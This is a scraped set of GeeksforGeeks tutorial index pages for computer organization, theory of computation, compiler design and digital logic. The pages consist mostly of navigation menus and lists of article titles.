UnitDifference between Hardwired and Micro-programmed Control Unit | Set 2Difference between Horizontal and Vertical micro-programmed Control UnitSynchronous Data Transfer in Computer OrganizationInstruction pipeliningexpand_moreComputer Organization and Architecture | Pipelining | Set 1 (Execution, Stages and Throughput)Computer Organization and Architecture | Pipelining | Set 2 (Dependencies and Data Hazard)Computer Organization and Architecture | Pipelining | Set 3 (Types and Stalling)Computer Organization | Different Instruction CyclesComputer Organization | Performance of ComputerComputer Organization | Micro-OperationComputer Organization | RISC and CISCDifference between RISC and CISC processor | Set 2Cache Memoryexpand_moreMemory Hierarchy Design and its CharacteristicsCache Memory in Computer OrganizationCache Organization | Set 1 (Introduction)Computer Organization | Locality and Cache friendly codeWhat’s difference between CPU Cache and TLB?Read and Write operations in MemoryMemory InterleavingIntroduction to memory and memory units2D and 2.5D Memory organizationRandom Access Memory (RAM) and Read Only Memory (ROM)Different Types of RAM (Random Access Memory )Difference between RAM and ROMI/O interface (Interrupt and DMA mode)expand_moreI/O Interface (Interrupt and DMA Mode)Introduction of Input-Output ProcessorKernel I/O Subsystem in Operating SystemMemory mapped I/O and Isolated I/OBUS Arbitration in Computer OrganizationPriority Interrupts | (S/W Polling and Daisy Chaining)Computer Organization | Asynchronous input output synchronizationIntroduction of Ports in ComputersClusters In Computer OrganisationHuman – Computer interaction through the agesCOA GATE Questionsexpand_moreDigital Logic & Number representationNumber RepresentationMicroprocessorComputer Organization and Architecture Computer Organization and Architecture Tutorials Recent Articles on Computer Organisation Topics : Basic Computer Instructions Instruction Design and Format Computer Arithmetic Microprogrammed Control Memory Organization Input and Output Systems Pipelining Miscellaneous Programs Quick Links Basic Computer Instructions : Basic Computer Instructions Addressing Modes Memory based Vs Register based addressing modes Von Neumann architecture Interaction of a Program with Hardware Simplified Instructional Computer (SIC) Instruction Set used in simplified instructional Computer (SIC) Instruction Set used in SIC/XE RISC and CISC RISC and CISC | Set 2 Vector processor classification Single Accumulator based CPU organization Stack based CPU Organization General Register based CPU Organization Machine Control Instruction Instruction Design and Format : Different Instruction Cycles Machine Instructions Instruction Formats (Zero, One, Two and Three Address Instruction) Register content and Flag status after Instructions Debugging a machine level program Vector Instruction Format Vector instruction types Branch Prediction in Pentium Instruction Word Size >> Problem Solving on Instruction Format Computer Arithmetic : Computer Arithmetic | ALU and Data Path Computer Arithmetic | Set 1 Computer Arithmetic | Set 2 Difference between 1’s complement and 2’s complement Restoring Division Algorithm For Unsigned Integer Non-Restoring Division For Unsigned Integer Booth’s Algorithm Overflow in Arithmetic Addition How the negative numbers are stored in memory? Conventional Computing vs Quantum Computing >> Quiz on Number Representation Microprogrammed Control : Micro-Operation Microarchitecture and Instruction Set Architecture Difference between CALL and JUMP instructions Hardwired v/s Micro-programmed Control Unit Performance of Computer Control Unit and design Horizontal micro-programmed Vs Vertical micro-programmed control unit Camparisons between Hardwired Vs Micro-programmed Control unit Computer Organization | Subprogram and its characteristics Memory Organization : Introduction to memory and memory units Memory Hierarchy Design and its Characteristics Difference between Byte Addressable Memory and Word Addressable Memory Difference between Simultaneous and Hierarchical Access Memory Organisations Register Allocation Cache Memory Cache Organization | Set 1 (Introduction) Multilevel Cache Organisation Locality and Cache friendly code Locality of Reference and Cache Operation Amdahl’s law and its proof Subroutine, Subroutine nesting and Stack memory RAM vs ROM What’s difference between CPU Cache and TLB? Different Types of RAM Types of computer memory (RAM and ROM) Secondary memory – Hard disk drive Introduction to solid-state drive (SSD) Read and Write operations in memory 2D and 2.5D Memory organization Input and Output Systems : Priority Interrupts | (S/W Polling and Daisy Chaining) I/O Interface (Interrupt and DMA Mode) Direct memory access with DMA controller 8257/8237 Asynchronous input output synchronization Programmable peripheral interface 8255 Interface 8255 with 8085 microprocessor for 1’s and 2’s complement of a number 8255 (programmable peripheral interface) Microcomputer system Working of 8085-based Single board microcomputer Interface 8254 PIT with 8085 microprocessor Synchronous Data Transfer Input-Output Processor MPU Communication Memory mapped I/O and Isolated I/O BUS Arbitration Pipelining : Execution, Stages and Throughput Types and Stalling Dependencies and Data Hazard IEEE Number Statndards IEEE Standard 754 Floating Point Numbers Miscellaneous : Microprocessor Microprocessor | Externally Initiated Operations Bus organization of 8085 microprocessor Generations of computer Intel x86 evolution and main features Memory Banking Introduction to quantum computing Conventional Computing vs Quantum Computing Rethinking binary with Quantum computers Flynn’s taxonomy Clusters In Computer Organisation Parallel processing – systolic arrays 8259 PIC Microprocessor Block Diagram of 8259 Microprocessor Microprocessor | 8251 USART Evolution of Microprocessors Human – Computer interaction through the ages Computer Ports Introduction to Parallel Computing Hardware architecture (parallel computing) Computer Architecture | Multiprocessor and Multicomputer Timing diagram of INR M Programs : Program for Binary To Decimal Conversion Program for Decimal to Binary Conversion Program for decimal to octal conversion Program for octal to decimal conversion Program for hexadecimal to decimal Quick Links : ‘Quizzes’ on Computer Organization and Architecture ! ‘Practice Problems’ on Computer Organization and Architecture ! My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseTypes of Environments in AITop 40 Python Interview Questions & AnswersProof that Clique Decision problem is NP-Complete | Set 2 Most Visited Articles Difference between List VS Set VS Tuple in PythonMajor Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try OnceFibonacci Series Program in JavaScriptHow to send an email from JavaScript ? room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Theory Of Computation and Automata Tutorials - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Regular expression, languages, grammar and finite automataexpand_moreTheory Of Computation and Automata TutorialsIntroduction of Theory of ComputationIntroduction of Finite AutomataChomsky Hierarchy in Theory of ComputationRegular Expressions, Regular Grammar and Regular LanguagesPumping Lemma in Theory of ComputationArden’s Theorem in Theory of ComputationHow to identify if a language is regular or notDesigning Finite Automata from Regular Expression (Set 1)Program to Implement NFA with epsilon move to DFA ConversionConversion from NFA to DFAMinimization of DFAGenerating regular expression from Finite AutomataUnion and Intersection of Regular languages with CFLDesigning Deterministic Finite Automata (Set 1)Designing Deterministic Finite Automata (Set 2)DFA of a string with at least two 0’s and at least two 1’sDFA machines accepting odd number of 0’s or/and even number of 1’sDFA for accepting the language L = { anbm | n+m=even }DFA for Strings not ending with “THE”Union process in DFAConcatenation process in DFAStar Height of Regular Expression and Regular LanguageMealy and Moore Machines in TOCDifference between Mealy machine and Moore machineContext free languages, grammar and push down automataexpand_moreIntroduction of Pushdown AutomataPushdown Automata Acceptance by Final StateCheck if the language is Context Free or NotConstruct Pushdown Automata for given languagesConstruct Pushdown automata for L = {0n1m2m3n | m,n ≥ 0}Construct Pushdown automata for L = {0n1m2(n+m) | m,n ≥ 0}Construct Pushdown Automata for all length palindromeNPDA for the language L ={w∈ {a,b}*| w contains equal no. of a’s and b’s}NPDA for accepting the language L = {an bn | n>=1}NPDA for accepting the language L = {an bm cn | m,n>=1}NPDA for accepting the language L = {an bn cm | m,n>=1}NPDA for accepting the language L = {am b(2m) | m>=1}NPDA for accepting the language L = {am bn cp dq | m+n=p+q ; m,n,p,q>=1}Construct Pushdown automata for L = {a(2*m)c(4*n)dnbm | m,n ≥ 0}NPDA for accepting the language L = {ambnc(m+n) | m,n ≥ 1}NPDA for accepting the language L = {amb(m+n)cn | m,n ≥ 1}NPDA for accepting the language L = {a2mb3m | m ≥ 1}NPDA for accepting the language L = {amb(2m+1) | m ≥ 1}NPDA for L = {0i1j2k | i==j or j==k ; i , j , k >= 1}Closure Properties of Context Free LanguagesAmbiguity in Context free Grammar and Context free LanguagesSimplifying Context Free GrammarsConverting Context Free Grammar to Chomsky Normal FormConverting Context Free Grammar to Greibach Normal FormRelationship between grammar and language in Theory of ComputationContext Sensitive langaugesexpand_moreContext-sensitive Grammar (CSG) and Language (CSL)Turing machinesexpand_moreRecursive and Recursive Enumerable Languages in TOCTuring Machine in TOCHalting Problem in Theory of ComputationTuring Machine for additionTuring machine for subtraction | Set 1Turing Machine for subtraction | Set 2Turing machine for multiplicationTuring machine for copying dataConstruct a Turing Machine for language L = {0n1n2n | n≥1}Construct a Turing Machine for language L = {wwr | w ∈ {0, 1}}Construct a Turing Machine for language L = {ww | w ∈ {0,1}}Construct Turing machine for L = {an bm a(n+m) | n,m≥1}Construct a Turing machine for L = {aibjck | i*j = k; i, j, k ≥ 1}Proof that Hamiltonian Path is NP-CompleteUndecidabilityexpand_moreProof that vertex cover is NP completeDecidability and Undecidability in TOCDecidable and Undecidable problems in Theory of ComputationUndecidability and Reducibility in TOCComputable and non-computable problems in TOCTOC Quizesexpand_moreAutomata Theory | Set 1Automata Theory | Set 2Automata Theory | Set 3Automata Theory | Set 4Automata Theory | Set 5Automata Theory | Set 6TOC GATE Questionsexpand_moreRegular languages and finite automataPractice problems on finite automataPractice problems on finite automata | Set 2Context free languages and Push-down automataRecursively enumerable sets and Turing machinesUndecidability Theory Of Computation and Automata Tutorials Recent Articles on Theory Of Computation Introduction Regular Languages and Finite Automata Context Free Grammar and Context Free Languages Pushdown Automata Turing Machine Decidability Quick Links Introduction : Introduction of Theory of Computation Chomsky Hierarchy Applications of various Automata Regular Languages and Finite Automata : Finite Automata Introduction Arden’s Theorem and Challenging Applications | Set 2 L-graphs and what they represent Hypothesis (language regularity) and algorithm (L-graph to NFA) Regular Expressions,Regular Grammar and Regular Languages How to identify if a language is regular or not Arden’s Theorem Finite Automata from Regular Expressions Star Height of Regular Expression and Regular Language Generating regular expression from finite automata Designing Deterministic Finite Automata (Set 1) Designing Deterministic Finite Automata (Set 2) DFA for Strings not ending with “THE” DFA of a string with at least two 0’s and at least two 1’s DFA for accepting the language L = { anbm | n+m=even } DFA machines accepting odd number of 0’s or/and even number of 1’s DFA of a string in which 2nd symbol from RHS is ‘a’ Union process in DFA Concatenation process in DFA DFA in LEX code which accepts even number of zeros and even number of ones. NFA to DFA Conversion Program to Implement NFA with epsilon move to DFA Conversion Minimization of DFA Reversal process in DFA Complementation process in DFA Kleene’s Theorem Part-1 MEALY and MOORE Machines Difference between Mealy machine and Moore machine >> Practice problems on finite automata >> Practice problems on finite automata | Set 2 >> Quiz on Regular Languages and Finite Automata Context Free Grammar and Context Free Languages : Relationship between grammar and language Simplifying Context Free Grammars Closure Properties of Context Free Languages(CFL) Union & Intersection of Regular languages with CFL Converting Context Free Grammar to Chomsky Normal Form Converting Context Free Grammar to Greibach Normal Form Pumping Lemma Check if the language is Context Free or Not Ambiguity in Context Free Grammar Operator grammar and precedence parser Context-sensitive Grammar (CSG) and Language (CSL) Pushdown Automata : Pushdown Automata Pushdown Automata Acceptance by Final State Construct Pushdown Automata for given languages Construct Pushdown Automata for all length palindrome Detailed Study of PushDown Automata NPDA for accepting the language L = {an bm cn| m,n>=1} NPDA for accepting the language L = {an bn cm | m,n>=1} NPDA for accepting the language L = {anbn | n>=1} NPDA for accepting the language L = {am b(2m) | m>=1} NPDA for accepting the language L = {am bn cp dq| m+n=p+q ; m,n,p,q>=1} Construct Pushdown automata for L = {0n1m2m3n | m,n ? 0} Construct Pushdown automata for L = {0n1m2(n+m) | m,n ? 0} NPDA for accepting the language L = {ambnc(n+m) | m,n ? 1} NPDA for accepting the language L = {amb(n+m)cn| m,n ? 1} NPDA for accepting the language L = {a2mb3m | m ? 1} NPDA for accepting the language L = {amb(2m+1) | m ? 1} NPDA for accepting the language L = {aibjckdl | i==k or j==l,i>=1,j>=1} Construct Pushdown automata for L = {a(2*m)c(4*n)dnbm | m,n ? 0} Construct Pushdown automata for L = {0n1m2(n+m) | m,n ? 0} NPDA for L = {0i1j2k | i==j or j==k ; i , j , k >= 1} NPDA for accepting the language L = {anb(2n) | n>=1} U {anbn | n>=1} NPDA for the language L ={w?{a,b}*| w contains equal no. of a’s and b’s} >> Quiz on Context Free Languages and Pushdown Automata Turing Machine : Turing Machine Turing Machine for addition Turing machine for subtraction | Set 1 Turing machine for multiplication Turing machine for copying data Construct a Turing Machine for language L = {0n1n2n | n?1} Construct a Turing Machine for language L = {wwr | w ? {0, 1}} Construct a Turing Machine for language L = {ww | w ? {0,1}} Construct Turing machine for L = {anbma(n+m) | n,m?1} Construct a Turing machine for L = {aibjck | i*j = k; i, j, k ? 1} Turing machine for 1’s and 2’s complement Recursive and Recursive Enumerable Languages Turing Machine for subtraction | Set 2 Halting Problem Theory of Computation | Applications of various Automata Turing Machine as Comparator >> Quiz on Turing Machines and Recursively Enumerable Sets Decidability : Decidable and undecidable problems Decidability Undecidability and Reducibility NP-Completeness | Set 1 (Introduction) Proof that Hamiltonian Path is NP-Complete Proof that vertex cover is NP complete Computable and non-computable problems >> Quiz on Undecidability Quick Links : Last Minute Notes(LMNs) ‘Quizzes’ on Theory Of Computation ! ‘Practice Problems’ on Theory of Computation ! Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseTop 40 Python Interview Questions & AnswersProof that Clique Decision problem is NP-Complete | Set 2Difference between List VS Set VS Tuple in Python Most Visited Articles Major Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try OnceCheck whether count of odd and even factors of a number are equalFibonacci Series Program in JavaScriptHow to send an email from JavaScript ? room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Compiler Design Tutorials - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Introduction of Compilerexpand_moreCompiler Design TutorialsIntroduction of Compiler DesignPhases of a CompilerSymbol Table in CompilerStatic and Dynamic ScopingGeneration of Programming LanguagesError Handling in Compiler DesignError detection and Recovery in CompilerLinkerLexical analysisexpand_moreIntroduction of Lexical AnalysisC program to detect tokens in a C programFlex (Fast Lexical Analyzer Generator )Parsingexpand_moreClassification of Context Free GrammarsAmbiguous GrammarWhy FIRST and FOLLOW in Compiler Design?FIRST Set in Syntax AnalysisFOLLOW Set in Syntax AnalysisProgram to calculate First and Follow sets of given grammarIntroduction to Syntax Analysis in Compiler DesignParsing | Set 1 (Introduction, Ambiguity and Parsers)Bottom Up or Shift Reduce Parsers | Set 2SLR, CLR and LALR Parsers | Set 3Shift Reduce Parser in CompilerClassification of Top Down ParsersOperator grammar and precedence parser in TOCSyntax directed transalationexpand_moreSyntax Directed Translation in Compiler DesignS – attributed and L – attributed SDTs in Syntax directed translationRuntime environmentsexpand_moreRuntime Environments in Compiler DesignIntermediate code generationexpand_moreIntermediate Code Generation in Compiler DesignThree address code in CompilerCompiler Design | Detection of a Loop in Three Address CodeCode Optimization in Compiler DesignIntroduction of Object Code in Compiler DesignData flow analysis in CompilerCD MCQexpand_moreMCQ on Memory allocation and compilation processCompiler Theory | Set 1Compiler Theory | Set 2CD GATE Questionsexpand_moreLexical analysisParsing and Syntax directed translationCode Generation and Optimization Compiler Design Tutorials Recent Articles on Compiler Design ! Introduction Lexical Analysis Syntax Analysis Syntax Directed Translation Code Generation and Optimization Runtime Environments Quick Links Introduction : Introduction of Compiler design Compiler construction tools Phases of a Compiler Symbol Table in Compiler C++ Program to implement Symbol Table Error detection and Recovery in Compiler Error Handling in Compiler Design Language Processors: Assembler, Compiler and Interpreter Generation of Programming Languages Lexical Analysis : Lexical Analysis C program to detect tokens in a C program Flex (Fast Lexical Analyzer Generator ) >> Quiz on Lexical Analyses Syntax Analysis : Introduction to Syntax Analyses Why FIRST and FOLLOW? FIRST Set in Syntax Analyses FOLLOW Set in Syntax Analyses Program to calculate First and Follow sets of given grammar Classification of Context Free Grammars(CFG) Ambiguous Grammar Parsing | Set 1 (Introduction, Ambiguity and Parsers) Classification of top down parsers Parsing | Set 2 (Bottom Up or Shift Reduce Parsers) Shift Reduce Parser in Compiler Parsing | Set 3 (SLR, CLR and LALR Parsers) Theory of Computation | Operator grammar and precedence parser Syntax Directed Translation : Syntax Directed Translation S – attributed and L – attributed SDTs in Syntax directed translation >> Quiz on Parsing and Syntax Directed Translation Code Generation and Optimization : Code Optimization Intermediate Code Generation Issues in the design of a code generator Three address code in Compiler Compiler Design | Detection of a Loop in Three Address Code Introduction of Object Code Data flow analysis in Compiler >> Quiz on Code Generation and Optimization Runtime Environments : Static and Dynamic Scoping Compiler Design | Runtime Environments Compiler Design | Linker Loader in C/C++ Developing a Linux based shell Quick Links : GATE | Previous Years Questions : Set – 1, Set – 2 Quiz on Compiler Design ‘Practice Problems’ on Compiler ! Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseTypes of Environments in AITop 40 Python Interview Questions & AnswersProof that Clique Decision problem is NP-Complete | Set 2 Most Visited Articles Difference between List VS Set VS Tuple in PythonMajor Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try OnceFibonacci Series Program in JavaScriptHow to send an email from JavaScript ? room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Digital Electronics and Logic Design Tutorials - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Introduction of Boolean Algebra and Logic Gatesexpand_moreDigital Electronics and Logic Design TutorialsIntroduction of Logic GatesProperties of Boolean AlgebraMinimization of Boolean FunctionsRepresentation of Boolean FunctionsCanonical and Standard FormFunctional Completeness in Digital LogicIntroduction of K-Map (Karnaugh Map)Various Implicants in K-MapPDNF and PCNF in Discrete MathematicsVariable Entrant Map (VEM) in Digital LogicConsensus Theorem in Digital LogicDifference between combinational and sequential circuitCombinational Circuitsexpand_moreHalf Adder in Digital LogicFull Adder in Digital LogicHalf Subtractor in Digital LogicFull Subtractor in Digital LogicHalf Adder and Half Subtractor using NAND NOR gatesEncoders and Decoders in Digital LogicEncoder in Digital LogicBinary Decoder in Digital LogicCombinational circuits using DecoderMultiplexers in Digital LogicCarry Look-Ahead AdderParallel Adder and Parallel SubtractorBCD Adder in Digital LogicMagnitude Comparator in Digital LogicBCD to 7 Segment DecoderProgrammable Logic ArrayProgramming Array LogicClassification and Programming of Read-Only Memory (ROM)Sequential Circuitsexpand_moreIntroduction of Sequential CircuitsFlip-flop types, their Conversion and ApplicationsSynchronous Sequential Circuits in Digital LogicCounters in Digital LogicRing Counter in Digital Logicn-bit Johnson Counter in Digital LogicRipple Counter in Digital LogicDesign counter for given sequenceMaster-Slave JK Flip FlopAsynchronous Sequential CircuitsShift Registers in Digital LogicDesign 101 sequence detector (Mealy machine)Amortized analysis for increment in counterNumber Representation and Computer Airthmeticexpand_moreNumber System and Base ConversionsCode Converters – BCD(8421) to/from Excess-3Code Converters – Binary to/from Gray CodeProgram for Decimal to Binary ConversionProgram for Binary To Decimal ConversionProgram for Decimal to Octal ConversionProgram for Octal to Decimal ConversionProgram for Hexadecimal to DecimalComputer Arithmetic | Set – 1Computer Arithmetic | Set – 2Introduction of Floating Point RepresentationWhat’s difference between 1’s Complement and 2’s Complement?Computer Organization | Booth’s AlgorithmRestoring Division Algorithm For Unsigned IntegerNon-Restoring Division For Unsigned IntegerDLD GATE Questionsexpand_moreDigital Logic & Number representationNumber Representation Digital Electronics and Logic Design Tutorials Recent Articles on Digital Electronics and Logic Design Topics : Number System and Representation Programs Boolean Algebra and Logic Gates Gate Level Minimization Combinational Logic Circuits Flip-Flops and Sequential Circuits Register and Counters Memory and Programmable Logic Data Communication Quick Links Number System and Representation : Binary representations Number System and Base Conversions Floating Point Representation Programs : Program for Binary To Decimal Conversion Program for Decimal to Binary Conversion Program for decimal to octal conversion Program for octal to decimal conversion Program for hexadecimal to decimal Boolean Algebra and Logic Gates : Properties of Boolean algebra Representation of Boolean Functions Canonical and Standard Form Functional Completeness Logic Gates Gate Level Minimization : K-Map(Karnaugh Map) Implicants in K-Map 5 variable K-Map Variable entrant map (VEM) Minimization of Boolean Functions Consensus theorem Combinational Logic Circuits : Half-Adder Half-Subtractor Half-Adder and Half-Subtractor using NAND NOR Gates Full-Adder Full Subtractor Code Converters – BCD(8421) to/from Excess-3 Code Converters – Binary to/from Gray Code Code Converters – BCD to 7 Segment Decoder Parallel Adder & Parallel Subtractor Carry Look-Ahead Adder Magnitude Comparator BCD Adder Encoders and Decoders Encoder Binary Decoder Combinational circuits using Decoder Multiplexers Static Hazards Flip-Flops and Sequential Circuits : Latches One bit memory cell Flip-Flops(Types and Conversions) Master Slave JK Flip Flop Introduction of Sequential Circuits Synchronous Sequential Circuits Asynchronous Sequential Circuits Difference between combinational and sequential circuit RTL (Register Transfer Level) design vs Sequential logic design Difference between Synchronous and Asynchronous Sequential Circuits Register and Counters : Counters Design counter for given sequence n-bit Johnson Counter Amortized analysis for increment in counter Ripple Counter Digital Logic | Ring Counter Shift Registers Design 101 sequence detector Universal Shift Register RTL (Register Transfer Level) design vs Sequential logic design Verilog Data Types Memory and Programmable Logic : Read-Only Memory (ROM) | Classification and Programming Programmable Logic Array Programming Array Logic RAM vs ROM Operational Amplifier (op-amp) Data Communication : Block Coding Difference between Unipolar, Polar and Bipolar Line Coding Difference between Broadband and Baseband Transmission Transmission Impairment What is Scrambling? Analog to Analog Conversion (Modulation) Analog to digital conversion Digital to Analog Conversion Difference Between Digital And Analog System Quick Links : Last Minute Notes (LMNs) Quizzes on Digital Electronics and Logic Design Practice Problems on Digital Electronics and Logic Design ! Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseTop 40 Python Interview Questions & AnswersProof that Clique Decision problem is NP-Complete | Set 2Difference between List VS Set VS Tuple in Python Most Visited Articles Major Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try OnceFibonacci Series Program in JavaScriptHow to send an email from JavaScript ?How To Create a Countdown Timer Using Python? room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

